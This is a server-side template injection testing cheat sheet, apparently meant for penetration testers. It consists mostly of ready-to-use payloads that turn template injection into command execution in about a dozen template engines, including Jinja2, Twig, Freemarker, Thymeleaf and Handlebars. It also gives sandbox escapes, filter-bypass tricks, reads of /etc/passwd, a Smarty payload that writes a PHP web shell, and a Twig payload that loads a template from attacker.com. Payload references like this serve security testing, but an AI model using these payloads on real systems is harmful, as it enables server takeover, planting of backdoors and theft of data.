# Server-Side Template Injection (SSTI) Testing Methodology

## Quick Reference

**Detection Payloads:**
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
@(7*7)
```

**Expected results:** `49` confirms template processing

---

## Template Engine Detection

### Detection Flowchart

```
${7*7} → 49? → Java (Freemarker, Velocity, Thymeleaf) or JavaScript
       → Error/49 with {{}} → Try {{7*7}}

{{7*7}} → 49? → Jinja2, Twig, Django, Nunjucks, Handlebars
        → Error? → Try {7*7}

<%= 7*7 %> → 49? → ERB (Ruby), EJS (Node.js)

#{7*7} → 49? → Slim, Pug

*{7*7} → 49? → Thymeleaf

@(7*7) → 49? → Razor (.NET)
```

### Universal Detection Sequence

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{7*'7'}}     → 7777777 confirms Jinja2/Twig
```

---

## Template Engine-Specific Payloads

### Jinja2 (Python/Flask)

**Detection:**
```python
{{7*7}}
{{config}}
{{self.__class__.__mro__}}
```

**RCE Payloads:**
```python
# Classic
{{''.__class__.__mro__[1].__subclasses__()}}

# Find subprocess.Popen index (usually ~400)
{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()}}

# Alternative approach
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Using request object
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Bypass without quotes
{{lipsum.__globals__.os.popen(request.args.cmd).read()}}
```

**Bypass Filters:**
```python
# Without {{ }}
{% print(7*7) %}

# Without .
{{''|attr('__class__')|attr('__mro__')|last|attr('__subclasses__')()}}

# Without []
{{''.__class__.__mro__.__getitem__(1)}}

# Using |attr and join
{%set a='__cla'+'ss__'%}{{''|attr(a)}}
```

### Twig (PHP)

**Detection:**
```twig
{{7*7}}
{{7*'7'}}  → 49 (Twig evaluates)
{{_self}}
{{_self.env}}
```

**RCE Payloads:**
```twig
# Twig 1.x
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Twig 1.x alternative
{{_self.env.setCache("ftp://attacker.com/")}}{{_self.env.loadTemplate("shell")}}

# Twig 2.x+ (filter)
{{['id']|filter('system')}}

# Twig 3.x+
{{['id']|map('system')}}
{{['id']|reduce('system')}}
```

### Freemarker (Java)

**Detection:**
```freemarker
${7*7}
${.version}
<#assign x=7*7>${x}
```

**RCE Payloads:**
```freemarker
# Classic
${"freemarker.template.utility.Execute"?new()("id")}

# Alternative
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Using ObjectConstructor
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["id"]).start()}
```

### Velocity (Java)

**Detection:**
```velocity
#set($x=7*7)$x
$class.inspect("java.lang.Runtime")
```

**RCE Payloads:**
```velocity
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$chr.toString($chr.toChars($out.read()))#end
```

### Thymeleaf (Java/Spring)

**Detection:**
```thymeleaf
*{7*7}
${7*7}
[[${7*7}]]
```

**RCE Payloads:**
```thymeleaf
# Pre-3.0.12
${T(java.lang.Runtime).getRuntime().exec('id')}

# URL injection
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x

# Expression in link
<a th:href="@{__${T(java.lang.Runtime).getRuntime().exec('id')}__}">
```

### Smarty (PHP)

**Detection:**
```smarty
{$smarty.version}
{7*7}
```

**RCE Payloads:**
```smarty
# Smarty 3
{php}echo `id`;{/php}

# Without {php} (Smarty 3)
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

# Using tags
{system('id')}

# self.getStreamVariable
{self::getStreamVariable("file:///etc/passwd")}
```

### ERB (Ruby)

**Detection:**
```erb
<%= 7*7 %>
<%= self %>
<%= File.open('/etc/passwd').read %>
```

**RCE Payloads:**
```erb
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= require 'open3'; Open3.capture3('id') %>
```

### Pug/Jade (Node.js)

**Detection:**
```pug
#{7*7}
#{root}
```

**RCE Payloads:**
```pug
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}

-var x = root.process.mainModule.require('child_process').execSync('id').toString()
-return x
```

### Nunjucks (Node.js)

**Detection:**
```nunjucks
{{7*7}}
{{range(10)}}
```

**RCE Payloads:**
```nunjucks
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

### Handlebars (Node.js)

**Detection:**
```handlebars
{{this}}
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
    {{/with}}
  {{/with}}
{{/with}}
```

**RCE Payloads:**
```handlebars
# Requires prototype pollution or custom helper
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Mako (Python)

**Detection:**
```mako
${7*7}
${self.module}
```

**RCE Payloads:**
```mako
<%
import os
os.popen("id").read()
%>

${self.module.cache.util.os.popen("id").read()}
```

### Razor (.NET)

**Detection:**
```razor
@(7*7)
@DateTime.Now
```

**RCE Payloads:**
```razor
@{
var p = new System.Diagnostics.Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c id";
p.Start();
}
```

---

## Sandbox Escape Techniques

### Python (Jinja2)

**Accessing builtins:**
```python
# Via empty string
{{''.__class__.__mro__[1].__subclasses__()}}

# Via lipsum
{{lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

# Via cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

**Finding useful classes:**
```python
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
{% if 'warning' in c.__name__ %}
{{c}}
{% endif %}
{% endfor %}
```

### Java (Freemarker/Velocity/Thymeleaf)

**Spring expression language:**
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
```

**ProcessBuilder:**
```java
${T(java.lang.ProcessBuilder).new(['id']).start()}
```

---

## Bypass Techniques

### Character Restrictions

**Without quotes:**
```python
# Using request args
{{lipsum.__globals__.os.popen(request.args.cmd).read()}}

# Using chr()
{{''.__class__.__mro__[1].__subclasses__()[x](().__class__.__bases__[0].__subclasses__()[y].__name__)}}
```

**Without brackets:**
```python
{{''|attr('__class__')|attr('__mro__')|last}}
```

**Without underscore:**
```python
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
```

### Blocked Keywords

**String concatenation:**
```python
{%set a='__cla'%}{%set b='ss__'%}{{''|attr(a~b)}}
```

**Encoding:**
```python
{{''|attr('\x5f\x5fclass\x5f\x5f')}}  # hex
```

---

## Detection Matrix

| Engine | Math Test | String Test | Unique |
|--------|-----------|-------------|--------|
| Jinja2 | {{7*7}} | {{7*'7'}}=7777777 | {{config}} |
| Twig | {{7*7}} | {{7*'7'}}=49 | {{_self.env}} |
| Freemarker | ${7*7} | - | <#assign> |
| Velocity | #set($x=7*7)$x | - | #foreach |
| Thymeleaf | ${7*7} | - | *{} |
| Smarty | {7*7} | - | {$smarty.version} |
| ERB | <%= 7*7 %> | - | <%= self %> |

---

## Verification Checklist

1. **Identify template injection point:**
   - [ ] User input reflected in page
   - [ ] Error messages reveal template engine

2. **Detect template engine:**
   - [ ] Test math expressions
   - [ ] Test engine-specific syntax
   - [ ] Check error messages

3. **Confirm code execution:**
   - [ ] Config/env disclosure
   - [ ] Command execution
   - [ ] File read

4. **Document evidence:**
   - [ ] Screenshot of command output
   - [ ] Working payload
   - [ ] Template engine version
